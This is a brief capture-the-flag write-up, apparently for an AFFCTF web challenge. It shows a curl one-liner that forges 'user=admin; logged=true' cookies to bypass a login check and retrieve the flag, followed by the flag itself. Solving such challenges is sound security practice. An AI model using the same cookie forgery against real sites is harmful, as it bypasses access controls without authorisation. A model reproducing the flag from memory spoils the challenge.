#### Challenge:

http://159.89.22.33:25633/

---

#### Solution:

```bash
curl 'http://159.89.22.33:25633/?page=flag'  -H 'Cookie: user=admin; logged=true' 2>/dev/null | grep AFFCTF
```

---

<details><summary>FLAG:</summary>

```
AFFCTF{n3v3r_7ru57_u5er5_1npUt}
```

</details>
